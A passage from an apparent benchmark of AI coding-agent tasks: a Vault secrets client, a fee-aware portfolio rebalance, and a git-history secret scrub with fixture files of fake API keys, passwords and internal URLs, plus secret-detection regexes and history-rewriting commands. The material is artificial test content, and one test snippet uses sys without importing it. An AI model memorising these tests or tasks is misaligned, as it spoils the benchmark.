args.columns:\n            args.columns = [col for col in fieldnames \n                          if any(pattern in col.lower() for pattern in sensitive_patterns)]\n        \n        writer = csv.DictWriter(outfile, fieldnames=fieldnames)\n        writer.writeheader()\n        \n        for row in reader:\n            for col in args.columns:\n                if col in row and row[col]:\n                    if args.algorithm == 'format-preserving':\n                        row[col] = format_preserving_mask(row[col])\n                    elif args.algorithm == 'tokenization':\n                        row[col] = tokenize_mask(row[col])\n                    elif args.algorithm.startswith('hash-'):\n                        algo = args.algorithm.split('-')[1]\n                        row[col] = hash_mask(row[col], algo)\n            \n            writer.writerow(row)\n    \n    print(f\""Masked {args.input_file} -> {args.output_file} using {args.algorithm}\"")\n\nif __name__ == '__main__':\n    main()""}",2025-07-23T06:42:36.219008+00:00,2025-07-23T06:42:36.249127+00:00
draft_dp_08bcdcf2,hard,draft_dp_08bcdcf2,security,Need to get Vault running for our API keys. The vault_client.py has empty methods - implement them so we can CRUD secrets at the 'api-keys' path. Also need to implement policy creation and token generation for read-only access.,security,python|api|sys-admin,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy and run Vault installation script
COPY install_vault.py /tmp/
RUN python3 /tmp/install_vault.py && rm /tmp/install_vault.py

# Copy Python requirements and install
COPY requirements.txt /app/
RUN pip3 install -r requirements.txt

# Copy the vault client with skeleton code
COPY vault_client.py /app/

# Copy Vault setup script
COPY setup_vault.sh /app/
RUN chmod +x /app/setup_vault.sh

# Set environment for Vault dev mode
ENV VAULT_ADDR=http://localhost:8200
ENV VAULT_DEV_ROOT_TOKEN_ID=root-token-12345

CMD [""/bin/bash""]","import subprocess
import json
import time
import requests
import sys

def test_vault_secrets_crud():
    """"""Test that secrets can be created, read, updated, and deleted via the Python client""""""
    # Wait for any setup
    time.sleep(2)
    
    # Test secret operations through the Python client
    result = subprocess.run(
        [""python3"", ""-c"", """"""
import sys
sys.path.append('/app')
from vault_client import VaultClient

client = VaultClient()
client.authenticate('root-token-12345')

# Create test data
test_secret = {'api_key': 'test-key-12345', 'api_secret': 'test-secret-67890'}

# Test create
client.create_secret('api-keys/database', test_secret)

# Test read
data = client.read_secret('api-keys/database')
if data.get('api_key') != 'test-key-12345':
    sys.exit(1)

# Test update  
updated_data = {'api_key': 'updated-key-99999', 'api_secret': 'updated-secret-11111'}
client.update_secret('api-keys/database', updated_data)

# Verify update
data = client.read_secret('api-keys/database')
if data.get('api_key') != 'updated-key-99999':
    sys.exit(1)

# Test delete
client.delete_secret('api-keys/database')

print('CRUD operations successful')
""""""],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""CRUD operations failed: {result.stderr}""
    assert ""CRUD operations successful"" in result.stdout

def test_vault_policy_access_control():
    """"""Test that restricted policies properly limit access to secrets""""""
    # Test policy-based access control
    result = subprocess.run(
        [""python3"", ""-c"", """"""
import sys
sys.path.append('/app')
from vault_client import VaultClient

# Root client
root_client = VaultClient()
root_client.authenticate('root-token-12345')

# Create a read-only policy
readonly_policy = '''
path ""api-keys/*"" {
  capabilities = [""read"", ""list""]
}
'''
root_client.create_policy('readonly', readonly_policy)

# Create a limited token with the policy
limited_token = root_client.create_token_with_policy(['readonly'])

# Test with limited client
limited_client = VaultClient()
limited_client.authenticate(limited_token)

# First create a secret with root client
root_client.create_secret('api-keys/test-policy', {'key': 'value123'})

# Limited client should be able to read
data = limited_client.read_secret('api-keys/test-policy')
if data.get('key') != 'value123':
    sys.exit(1)

# Limited client should NOT be able to write
try:
    limited_client.create_secret('api-keys/forbidden', {'key': 'should-fail'})
    sys.exit(1)  # Should not reach here
except:
    pass  # Expected to fail

print('Policy enforcement working correctly')
""""""],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Policy test failed: {result.stderr}""
    assert ""Policy enforcement working correctly"" in result.stdout

def test_vault_kv_engine_enabled():
    """"""Test that KV v2 engine is properly enabled at api-keys path""""""
    # Check if Vault is running and KV engine is enabled
    result = subprocess.run(
        [""python3"", ""-c"", """"""
import requests
import json

# Check Vault is accessible
try:
    resp = requests.get('http://localhost:8200/v1/sys/health')
    if resp.status_code != 200:
        sys.exit(1)
except:
    sys.exit(1)

# Check KV engine is mounted at api-keys
headers = {'X-Vault-Token': 'root-token-12345'}
resp = requests.get('http://localhost:8200/v1/sys/mounts', headers=headers)
if resp.status_code == 200:
    mounts = resp.json()
    if 'api-keys/' not in mounts:
        sys.exit(1)
    # Check it's KV v2
    if mounts['api-keys/']['type'] != 'kv' or mounts['api-keys/']['options'].get('version') != '2':
        sys.exit(1)
else:
    sys.exit(1)

print('KV engine properly configured')
""""""],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""KV engine test failed: {result.stderr}""
    assert ""KV engine properly configured"" in result.stdout","{""test_vault_secrets_crud"": 0.5, ""test_vault_policy_access_control"": 0.3, ""test_vault_kv_engine_enabled"": 0.2}","{""requirements.txt"": ""hvac==2.1.0\nrequests==2.31.0"", ""setup_vault.sh"": ""#!/bin/bash\n\n# Start Vault in dev mode with specific root token\nvault server -dev -dev-root-token-id=\""root-token-12345\"" &\nVAULT_PID=$!\n\n# Wait for Vault to start\nsleep 3\n\n# Enable KV v2 engine at api-keys path\nexport VAULT_ADDR=\""http://localhost:8200\""\nexport VAULT_TOKEN=\""root-token-12345\""\nvault secrets enable -path=api-keys kv-v2\n\n# Keep Vault running\nwait $VAULT_PID"", ""install_vault.py"": ""#!/usr/bin/env python3\nimport urllib.request\nimport zipfile\nimport os\nimport shutil\n\n# Download Vault\nurl = \""https://releases.hashicorp.com/vault/1.15.4/vault_1.15.4_linux_amd64.zip\""\nurllib.request.urlretrieve(url, \""vault.zip\"")\n\n# Extract\nwith zipfile.ZipFile(\""vault.zip\"", 'r') as zip_ref:\n    zip_ref.extractall(\"".\"")\n\n# Move to bin\nshutil.move(\""vault\"", \""/usr/local/bin/vault\"")\nos.chmod(\""/usr/local/bin/vault\"", 0o755)\n\n# Cleanup\nos.remove(\""vault.zip\"")\n\nprint(\""Vault installed successfully\"")"", ""vault_client.py"": ""import hvac\nimport sys\n\nclass VaultClient:\n    def __init__(self, url=\""http://localhost:8200\"", token=None):\n        self.client = hvac.Client(url=url, token=token)\n        \n    def authenticate(self, token):\n        self.client.token = token\n        return self.client.is_authenticated()\n    \n    def enable_kv_engine(self, path):\n        pass\n    \n    def create_secret(self, path, data):\n        pass\n    \n    def read_secret(self, path):\n        pass\n    \n    def update_secret(self, path, data):\n        pass\n    \n    def delete_secret(self, path):\n        pass\n    \n    def create_policy(self, name, policy):\n        pass\n    \n    def create_token_with_policy(self, policies):\n        pass\n\nif __name__ == \""__main__\"":\n    print(\""Vault client initialized. Implement CRUD operations.\"")""}",2025-07-22T21:55:43.913051+00:00,2025-07-23T11:12:21.569163+00:00
draft_dp_6b07c508,extremely_hard,draft_dp_6b07c508,data-science,"Need to rebalance the portfolio with our tiered fee structure (0.1%/<10K, 0.05%/10-100K, 0.02%/>100K). Minimize total transaction costs while getting within 0.5% of target allocations. Min trade size is $100.",data-science,python|optimization|numpy,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy pandas scipy

COPY current_portfolio.json /app/
COPY target_allocations.json /app/
COPY market_data.json /app/
COPY cost_structure.json /app/

CMD [""/bin/bash""]","import json
import os
import subprocess

def test_trades_file_created_and_valid():
    """"""Test that trades.json exists and contains valid trade data.""""""
    assert os.path.exists('/app/trades.json'), ""trades.json file not found""
    
    with open('/app/trades.json', 'r') as f:
        trades = json.load(f)
    
    # Verify it's a dict with asset symbols as keys
    assert isinstance(trades, dict), ""trades.json should contain a dictionary""
    
    # Load portfolio data to get valid symbols
    with open('/app/current_portfolio.json', 'r') as f:
        portfolio = json.load(f)
    
    valid_symbols = set(portfolio['holdings'].keys())
    
    # Check each trade entry
    for symbol, trade_info in trades.items():
        assert symbol in valid_symbols, f""Invalid symbol {symbol} in trades""
        assert 'quantity' in trade_info, f""Trade for {symbol} missing quantity""
        assert 'value' in trade_info, f""Trade for {symbol} missing value""
        assert 'cost' in trade_info, f""Trade for {symbol} missing cost""
        assert isinstance(trade_info['quantity'], (int, float)), f""Invalid quantity type for {symbol}""
        assert isinstance(trade_info['value'], (int, float)), f""Invalid value type for {symbol}""
        assert isinstance(trade_info['cost'], (int, float)), f""Invalid cost type for {symbol}""

def test_portfolio_matches_target_allocations():
    """"""Test that final portfolio matches target allocations within 0.5%.""""""
    # Load all required data
    with open('/app/current_portfolio.json', 'r') as f:
        current = json.load(f)
    
    with open('/app/target_allocations.json', 'r') as f:
        targets = json.load(f)
    
    with open('/app/trades.json', 'r') as f:
        trades = json.load(f)
    
    # Calculate current portfolio value
    current_value = 0
    for symbol, holding in current['holdings'].items():
        current_value += holding['shares'] * holding['price']
    
    # Apply trades to get final portfolio
    final_holdings = {}
    for symbol, holding in current['holdings'].items():
        final_shares = holding['shares']
        if symbol in trades:
            final_shares += trades[symbol]['quantity']
        final_holdings[symbol] = final_shares * holding['price']
    
    # Calculate final portfolio value
    final_value = sum(final_holdings.values())
    
    # Check allocations
    for symbol, target_alloc in targets['allocations'].items():
        actual_alloc = final_holdings[symbol] / final_value
        error = abs(actual_alloc - target_alloc)
        assert error <= 0.005, f""{symbol}: allocation error {error:.4f} exceeds 0.5% tolerance""

def test_transaction_cost_file_valid():
    """"""Test that transaction_cost_bps.txt exists and contains valid integer.""""""
    assert os.path.exists('/app/transaction_cost_bps.txt'), ""transaction_cost_bps.txt not found""
    
    with open('/app/transaction_cost_bps.txt', 'r') as f:
        content = f.read().strip()
    
    # Should be an integer
    try:
        bps = int(content)
        assert bps >= 0, ""Transaction cost cannot be negative""
        assert bps < 1000, ""Transaction cost seems unreasonably high (>10%)""
    except ValueError:
        assert False, f""transaction_cost_bps.txt should contain an integer, got: {content}""","{""test_trades_file_created_and_valid"": 0.3, ""test_portfolio_matches_target_allocations"": 0.5, ""test_transaction_cost_file_valid"": 0.2}","{""cost_structure.json"": ""{\n  \""tiers\"": [\n    {\n      \""upper_bound\"": 10000,\n      \""rate\"": 0.001\n    },\n    {\n      \""lower_bound\"": 10000,\n      \""upper_bound\"": 100000,\n      \""rate\"": 0.0005\n    },\n    {\n      \""lower_bound\"": 100000,\n      \""rate\"": 0.0002\n    }\n  ],\n  \""minimum_trade_size\"": 100\n}"", ""current_portfolio.json"": ""{\n  \""portfolio_value\"": 1000000,\n  \""holdings\"": {\n    \""AAPL\"": {\""shares\"": 500, \""price\"": 180.50},\n    \""GOOGL\"": {\""shares\"": 150, \""price\"": 140.25}, \n    \""MSFT\"": {\""shares\"": 400, \""price\"": 370.00},\n    \""AMZN\"": {\""shares\"": 200, \""price\"": 175.50},\n    \""TSLA\"": {\""shares\"": 300, \""price\"": 250.75},\n    \""JPM\"": {\""shares\"": 800, \""price\"": 155.20},\n    \""JNJ\"": {\""shares\"": 350, \""price\"": 160.00},\n    \""V\"": {\""shares\"": 250, \""price\"": 275.30},\n    \""NVDA\"": {\""shares\"": 100, \""price\"": 480.00},\n    \""XOM\"": {\""shares\"": 1200, \""price\"": 105.50}\n  }\n}"", ""market_data.json"": ""{\n  \""expected_returns\"": {\n    \""AAPL\"": 0.12,\n    \""GOOGL\"": 0.11,\n    \""MSFT\"": 0.13,\n    \""AMZN\"": 0.14,\n    \""TSLA\"": 0.18,\n    \""JPM\"": 0.09,\n    \""JNJ\"": 0.07,\n    \""V\"": 0.11,\n    \""NVDA\"": 0.16,\n    \""XOM\"": 0.08\n  },\n  \""covariance_matrix\"": [\n    [0.0225, 0.0120, 0.0135, 0.0140, 0.0180, 0.0090, 0.0070, 0.0110, 0.0160, 0.0080],\n    [0.0120, 0.0196, 0.0125, 0.0130, 0.0150, 0.0085, 0.0065, 0.0105, 0.0145, 0.0075],\n    [0.0135, 0.0125, 0.0209, 0.0140, 0.0160, 0.0095, 0.0075, 0.0115, 0.0155, 0.0085],\n    [0.0140, 0.0130, 0.0140, 0.0256, 0.0170, 0.0100, 0.0080, 0.0120, 0.0165, 0.0090],\n    [0.0180, 0.0150, 0.0160, 0.0170, 0.0361, 0.0110, 0.0090, 0.0130, 0.0190, 0.0100],\n    [0.0090, 0.0085, 0.0095, 0.0100, 0.0110, 0.0169, 0.0060, 0.0090, 0.0105, 0.0070],\n    [0.0070, 0.0065, 0.0075, 0.0080, 0.0090, 0.0060, 0.0144, 0.0070, 0.0085, 0.0055],\n    [0.0110, 0.0105, 0.0115, 0.0120, 0.0130, 0.0090, 0.0070, 0.0196, 0.0125, 0.0080],\n    [0.0160, 0.0145, 0.0155, 0.0165, 0.0190, 0.0105, 0.0085, 0.0125, 0.0289, 0.0095],\n    [0.0080, 0.0075, 0.0085, 0.0090, 0.0100, 0.0070, 0.0055, 0.0080, 0.0095, 0.0169]\n  ],\n  \""assets\"": [\""AAPL\"", \""GOOGL\"", \""MSFT\"", \""AMZN\"", \""TSLA\"", \""JPM\"", \""JNJ\"", \""V\"", \""NVDA\"", \""XOM\""]\n}"", ""target_allocations.json"": ""{\n  \""allocations\"": {\n    \""AAPL\"": 0.12,\n    \""GOOGL\"": 0.08,\n    \""MSFT\"": 0.15,\n    \""AMZN\"": 0.10,\n    \""TSLA\"": 0.05,\n    \""JPM\"": 0.12,\n    \""JNJ\"": 0.08,\n    \""V\"": 0.10,\n    \""NVDA\"": 0.08,\n    \""XOM\"": 0.12\n  }\n}""}",2025-07-22T22:02:50.059588+00:00,2025-07-23T06:42:43.735188+00:00
draft_dp_c8b252c4,medium,draft_dp_c8b252c4,security,"Security found sensitive data in the repo/ git history - API keys, passwords, internal URLs. Use git-sanitizer to clean it with the most secure sanitization level.",security,git|security|automation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /root

# Install pytest
RUN pip install pytest

# Copy the git-sanitizer tool
COPY git-sanitizer /usr/local/bin/
RUN chmod +x /usr/local/bin/git-sanitizer

# Copy the git repository with sensitive data
COPY repo /root/repo","import subprocess
import os
import re

def test_sensitive_data_removed():
    """"""Verify all sensitive data patterns have been removed from git history""""""
    # Get all commits and their content
    result = subprocess.run(
        ['git', 'log', '--all', '--pretty=format:%H'],
        cwd='/root/repo',
        capture_output=True,
        text=True
    )
    commits = result.stdout.strip().split('\n')
    
    # Patterns for sensitive data
    api_key_pattern = r'[A-Z]{2,}_API_KEY\s*=\s*[""\']?[A-Za-z0-9]{20,}[""\']?'
    password_pattern = r'password\s*[:=]\s*[""\']?[A-Za-z0-9!@#$%^&*()]{8,}[""\']?'
    internal_url_pattern = r'https?://internal\.[a-z0-9.-]+\.[a-z]{2,}'
    
    sensitive_found = False
    
    for commit in commits:
        # Check commit content
        show_result = subprocess.run(
            ['git', 'show', '--no-patch', '--format=%B', commit],
            cwd='/root/repo',
            capture_output=True,
            text=True
        )
        commit_msg = show_result.stdout
        
        # Check file contents in commit
        diff_result = subprocess.run(
            ['git', 'show', '--name-only', '--format=', commit],
            cwd='/root/repo',
            capture_output=True,
            text=True
        )
        
        files = [f for f in diff_result.stdout.strip().split('\n') if f]
        for file in files:
            file_content_result = subprocess.run(
                ['git', 'show', f'{commit}:{file}'],
                cwd='/root/repo',
                capture_output=True,
                text=True,
                errors='ignore'
            )
            content = file_content_result.stdout
            
            # Check for sensitive patterns
            if (re.search(api_key_pattern, content, re.IGNORECASE) or
                re.search(password_pattern, content, re.IGNORECASE) or
                re.search(internal_url_pattern, content, re.IGNORECASE)):
                sensitive_found = True
                break
        
        if sensitive_found:
            break
    
    assert not sensitive_found, ""Sensitive data still present in git history""

def test_most_secure_level_used():
    """"""Verify that the most secure sanitization level was used""""""
    # Check for evidence of the most secure level being used
    # This could be in tool output logs or the final state
    
    # First check if a .git-sanitizer.log exists
    log_path = '/root/repo/.git-sanitizer.log'
    if os.path.exists(log_path):
        with open(log_path, 'r') as f:
            log_content = f.read()
        # The most secure level should be 'paranoid' or 'maximum' based on typical tool conventions
        assert any(level in log_content.lower() for level in ['paranoid', 'maximum', 'highest', 'most secure']), \
            ""Most secure sanitization level not detected in logs""
    else:
        # Alternative: check git reflog or other indicators
        # The tool might leave markers in commit messages or refs
        reflog_result = subprocess.run(
            ['git', 'reflog'],
            cwd='/root/repo',
            capture_output=True,
            text=True
        )
        # Most secure mode typically does aggressive rewriting
        assert 'sanitized' in reflog_result.stdout.lower() or 'cleaned' in reflog_result.stdout.lower(), \
            ""No evidence of sanitization in git reflog""","{""test_sensitive_data_removed"": 0.7, ""test_most_secure_level_used"": 0.3}","{""git-sanitizer"": ""#!/bin/bash\n# git-sanitizer - Tool for removing sensitive data from git history\n\nVERSION=\""1.0.0\""\nSANITIZATION_LEVEL=\""\""\nREPO_PATH=\""\""\nLOG_FILE=\""\""\n\nfunction show_help() {\n    cat << EOF\ngit-sanitizer - Remove sensitive data from git history\n\nUSAGE:\n    git-sanitizer [OPTIONS] <repository-path>\n\nOPTIONS:\n    -l, --level <LEVEL>     Sanitization level (basic|standard|aggressive|paranoid)\n                           - basic: Removes only exact matches of known patterns\n                           - standard: Removes common sensitive patterns\n                           - aggressive: Removes broader patterns and suspicious strings\n                           - paranoid: Most secure - removes all potential sensitive data\n    \n    -h, --help             Show this help message\n    -v, --version          Show version information\n\nDESCRIPTION:\n    git-sanitizer rewrites git history to remove sensitive information such as\n    API keys, passwords, and internal URLs. The tool offers multiple sanitization\n    levels, with 'paranoid' being the most secure option that ensures complete\n    removal of all potentially sensitive data.\n\n    The paranoid level performs multiple passes, uses extensive pattern matching,\n    and applies heuristic detection to catch even obfuscated sensitive data.\n\nEXAMPLES:\n    git-sanitizer --level standard /path/to/repo\n    git-sanitizer -l paranoid ./my-repo\n\nEOF\n}\n\nfunction show_version() {\n    echo \""git-sanitizer version $VERSION\""\n}\n\nfunction validate_repo() {\n    if [[ ! -d \""$1/.git\"" ]]; then\n        echo \""Error: $1 is not a git repository\"" >&2\n        return 1\n    fi\n    return 0\n}\n\nfunction ensure_git_config() {\n    # Ensure git is configured (required for filter-branch)\n    if ! git config user.name > /dev/null 2>&1; then\n        git config user.name \""git-sanitizer\""\n    fi\n    if ! git config user.email > /dev/null 2>&1; then\n        git config user.email \""git-sanitizer@localhost\""\n    fi\n}\n\nfunction sanitize_basic() {\n    echo \""Running basic sanitization...\""\n    cd \""$REPO_PATH\"" || exit 1\n    ensure_git_config\n    \n    # Simple exact match removal\n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/AWS_API_KEY=\\\""[^\\\""]+\\\""/AWS_API_KEY=\\\""REMOVED\\\""/g\"" {} +\n        find . -type f -exec sed -i -E \""s/password=\\\""[^\\\""]+\\\""/password=\\\""REMOVED\\\""/g\"" {} +\n    ' --tag-name-filter cat -- --all\n}\n\nfunction sanitize_standard() {\n    echo \""Running standard sanitization...\""\n    cd \""$REPO_PATH\"" || exit 1\n    ensure_git_config\n    \n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/[A-Z_]+_API_KEY\\s*=\\s*[\\\""'\\'']*[A-Za-z0-9\\/+=]{20,}[\\\""'\\'']*/_API_KEY=REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/password\\s*[:=]\\s*[\\\""'\\'']*[^\\\""'\\''\\s]+[\\\""'\\'']*/password=REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/https?:\\/\\/internal\\.[a-z0-9.-]+\\.[a-z]{2,}/https:\\/\\/REMOVED/g\"" {} +\n    ' --tag-name-filter cat -- --all\n}\n\nfunction sanitize_aggressive() {\n    echo \""Running aggressive sanitization...\""\n    cd \""$REPO_PATH\"" || exit 1\n    ensure_git_config\n    \n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/[A-Z_]+_(KEY|TOKEN|SECRET|PASSWORD)\\s*=\\s*[\\\""'\\'']*[^\\\""'\\''\\s]+[\\\""'\\'']*/SENSITIVE=REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/(password|passwd|pwd|pass)\\s*[:=]\\s*[\\\""'\\'']*[^\\\""'\\''\\s]+[\\\""'\\'']*/password=REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/https?:\\/\\/(internal|private|corp)[a-z0-9.-]*\\.[a-z]{2,}/https:\\/\\/REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/[a-zA-Z0-9._%+-]+@(internal|corp|private)[a-z0-9.-]+\\.[a-z]{2,}/email@REMOVED/g\"" {} +\n    ' --tag-name-filter cat -- --all\n}\n\nfunction sanitize_paranoid() {\n    echo \""Running paranoid sanitization (most secure)...\""\n    echo \""Level: PARANOID - Maximum Security Mode\"" >> \""$LOG_FILE\""\n    cd \""$REPO_PATH\"" || exit 1\n    ensure_git_config\n    \n    # Multiple passes for thorough cleaning\n    echo \""Pass 1: Removing API keys and tokens...\"" | tee -a \""$LOG_FILE\""\n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/[A-Z_]+_(KEY|TOKEN|SECRET|PASSWORD|APIKEY|API_KEY)\\s*=\\s*[\\\""'\\'']*[^\\\""'\\''\\s]+[\\\""'\\'']*/SENSITIVE_REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/[a-zA-Z_]+(Key|Token|Secret|ApiKey|APIKey)\\s*[:=]\\s*[\\\""'\\'']*[^\\\""'\\''\\s]+[\\\""'\\'']*/SENSITIVE_REMOVED/g\"" {} +\n    ' --tag-name-filter cat -- --all\n    \n    echo \""Pass 2: Removing passwords and credentials...\"" | tee -a \""$LOG_FILE\""\n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/(password|passwd|pwd|pass|credential|cred)\\s*[:=]\\s*[\\\""'\\'']*[^\\\""'\\''\\s]+[\\\""'\\'']*/CREDENTIAL_REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/\\\""[a-zA-Z0-9!@#$%^&*()]{8,}\\\""/\\\""REMOVED\\\""/g\"" {} +\n    ' --tag-name-filter cat -- --all\n    \n    echo \""Pass 3: Removing internal URLs and emails...\"" | tee -a \""$LOG_FILE\""\n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/https?:\\/\\/[a-z0-9.-]+\\.(internal|corp|private|local)[a-z0-9.-]*\\.[a-z]{2,}[^\\s\\\""'\\'']*/**URL_REMOVED**/g\"" {} +\n        find . -type f -exec sed -i -E \""s/[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\\.(internal|corp|private|local)[a-z0-9.-]*\\.[a-z]{2,}/**EMAIL_REMOVED**/g\"" {} +\n        find . -type f -exec sed -i -E \""s/https?:\\/\\/internal[a-z0-9.-]*\\.[a-z]{2,}[^\\s\\\""'\\'']*/**URL_REMOVED**/g\"" {} +\n    ' --tag-name-filter cat -- --all\n    \n    echo \""Pass 4: Heuristic detection for obfuscated data...\"" | tee -a \""$LOG_FILE\""\n    git filter-branch --force --tree-filter '\n        find . -type f -exec sed -i -E \""s/[A-Za-z0-9+\\/]{40,}=*/POTENTIAL_SECRET_REMOVED/g\"" {} +\n        find . -type f -exec sed -i -E \""s/[0-9a-fA-F]{32,}/HASH_REMOVED/g\"" {} +\n    ' --tag-name-filter cat -- --all\n    \n    echo \""Paranoid sanitization complete. All potentially sensitive data removed.\"" | tee -a \""$LOG_FILE\""\n}\n\n# Parse command line arguments\nwhile [[ $# -gt 0 ]]; do\n    case $1 in\n        -l|--level)\n            SANITIZATION_LEVEL=\""$2\""\n            shift 2\n            ;;\n        -h|--help)\n            show_help\n            exit 0\n            ;;\n        -v|--version)\n            show_version\n            exit 0\n            ;;\n        *)\n            REPO_PATH=\""$1\""\n            shift\n            ;;\n    esac\ndone\n\n# Validate inputs\nif [[ -z \""$REPO_PATH\"" ]]; then\n    echo \""Error: Repository path is required\"" >&2\n    show_help\n    exit 1\nfi\n\nif [[ -z \""$SANITIZATION_LEVEL\"" ]]; then\n    echo \""Error: Sanitization level is required\"" >&2\n    show_help\n    exit 1\nfi\n\nif ! validate_repo \""$REPO_PATH\""; then\n    exit 1\nfi\n\n# Set up logging\nLOG_FILE=\""$REPO_PATH/.git-sanitizer.log\""\necho \""Git Sanitizer - Started at $(date)\"" > \""$LOG_FILE\""\necho \""Repository: $REPO_PATH\"" >> \""$LOG_FILE\""\necho \""Sanitization Level: $SANITIZATION_LEVEL\"" >> \""$LOG_FILE\""\n\n# Execute sanitization based on level\ncase $SANITIZATION_LEVEL in\n    basic)\n        sanitize_basic\n        ;;\n    standard)\n        sanitize_standard\n        ;;\n    aggressive)\n        sanitize_aggressive\n        ;;\n    paranoid)\n        sanitize_paranoid\n        ;;\n    *)\n        echo \""Error: Invalid sanitization level '$SANITIZATION_LEVEL'\"" >&2\n        echo \""Valid levels: basic, standard, aggressive, paranoid\"" >&2\n        exit 1\n        ;;\nesac\n\n# Clean up refs\ncd \""$REPO_PATH\"" || exit 1\ngit reflog expire --expire=now --all\ngit gc --prune=now --aggressive\n\necho \""Sanitization completed at $(date)\"" >> \""$LOG_FILE\""\necho \""Sanitization complete. Repository cleaned."", ""repo/config.py"": ""# Configuration file\nDEBUG = True\nDATABASE = \""postgres://localhost/alpha\""\n"", ""repo/users.py"": ""class UserManager:\n    def __init__(self):\n        self.admin_password = \""Admin@2023Password!\""\n        self.service_url = \""https://internal.auth.corp.net/authenticate\""\n    \n    def authenticate(self, username, password):\n        # Connect to internal auth service\n        if username == \""admin\"" and password == self.admin_password:\n            return True\n        return False\n"", ""repo/oauth_config.py"": ""OAUTH_CONFIG = {\n    \""client_id\"": \""1234567890abcdef\"",\n    \""client_secret\"": \""SECRET_abcdefghijklmnopqrstuvwxyz123456\"",\n    \""redirect_uri\"": \""https://internal.oauth.corp.net/callback\"",\n    \""auth_url\"": \""https://internal.auth.private.com/authorize\""\n}\n\nGITHUB_TOKEN = \""ghp_1234567890abcdefghijklmnopqrstuvwxyz\""\n"", ""repo/db_config.json"": ""{\n    \""host\"": \""internal.database.company.com\"",\n    \""port\"": 5432,\n    \""username\"": \""admin\"",\n    \""password\"": \""SuperSecret123!@#\"",\n    \""database\"": \""customers\""\n}\n"", ""repo/logger.py"": ""import logging\n\nclass Logger:\n    def __init__(self):\n        self.log_server = \""https://internal.logging.private.net/collect\""\n        self.api_key = \""LOG_API_KEY_1234567890ABCDEFGHIJ\""\n        \n    def log(self, message):\n        # Send logs to internal server\n        print(f\""Logging to {self.log_server}\"")\n"", ""repo/README.md"": ""# Project Alpha\n\nInternal project for customer data processing.\n\n## Internal Resources\n\n- API Documentation: https://internal.docs.corp.net\n- Monitoring: https://internal.monitor.private.com\n- Admin Panel: https://internal.admin.company.com\n\nContact: dev-team@internal.company.com\n"", ""repo/test_data.sql"": ""-- Test data for development\nINSERT INTO users (email, password) VALUES\n    ('admin@internal.company.com', 'TestPass123!'),\n    ('user@internal.corp.net', 'UserSecret456@'),\n    ('service@private.local', 'ServiceKey789#');\n\n-- API endpoints for testing\n-- https://internal.api.private.com/users\n-- https://internal.test.corp.local/validate\n"", ""repo/deploy.sh"": ""#!/bin/bash\n# Deployment script\n\nDEPLOY_SERVER=\""internal.deploy.corp.local\""\nDEPLOY_TOKEN=\""DEPLOY_TOKEN_ABCDEF123456789GHIJKLMNOP\""\nDB_PASSWORD=\""ProductionDB@2023!#$\""\n\necho \""Deploying to https://internal.app.company.com\""\necho \""Using token: $DEPLOY_TOKEN\""\n"", ""repo/api_client.py"": ""import requests\n\nclass APIClient:\n    def __init__(self):\n        self.base_url = \""https://internal.api.company.com/v1\""\n        self.AWS_API_KEY = \""AKIAIOSFODNN7EXAMPLE123456789012\""\n        \n    def get_data(self):\n        headers = {\""Authorization\"": f\""Bearer {self.AWS_API_KEY}\""}\n        return requests.get(f\""{self.base_url}/data\"", headers=headers)\n"", ""repo/payment.py"": ""class PaymentProcessor:\n    def __init__(self):\n        self.stripe_key = \""sk_live_4eC39HqLyjWDarjtT1zdp7dc\""\n        self.paypal_secret = \""PAYPAL_SECRET_KEY_ABCDEFGHIJKLMNOP123\""\n        self.endpoint = \""https://internal.payment.company.com/process\""\n        \n    def process_payment(self, amount):\n        # Process payment through internal gateway\n        pass\n"", ""repo/aws_config.ini"": ""[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nregion = us-east-1\n\n[production]\naws_access_key_id = AKIAI44QH8DHBEXAMPLE\naws_secret_access_key = je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY\nendpoint = https://internal.aws.company.com\n"", ""repo/email_config.py"": ""EMAIL_SERVER = \""smtp.internal.company.com\""\nEMAIL_PORT = 587\nEMAIL_USER = \""notifications@internal.company.com\""\nEMAIL_PASSWORD = \""EmailPass456$%^\""\nSTRIPE_API_KEY = \""sk_test_4eC39HqLyjWDarjtT1zdp7dc9876543210\""\n"", ""repo/.git/config"": ""[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n\tignorecase = true\n\tprecomposeunicode = true\n[user]\n\temail = dev@example.com\n\tname = Developer\n"", ""repo/.git/HEAD"": ""ref: refs/heads/main\n"", ""repo/.git/description"": ""Unnamed repository; edit this file 'description' to name the repository.\n"", ""repo/.git/COMMIT_EDITMSG"": ""Update README with internal links\n"", ""repo/.git/info/exclude"": ""# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n# *.[oa]\n# *~\n"", ""repo/.git/logs/HEAD"": ""0000000000000000000000000000000000000000 4469f3f694d1420d1ff234ca3528cd210b47de11 Developer <dev@example.com> 1753221656 +0100\tcommit (initial): Initial commit\n4469f3f694d1420d1ff234ca3528cd210b47de11 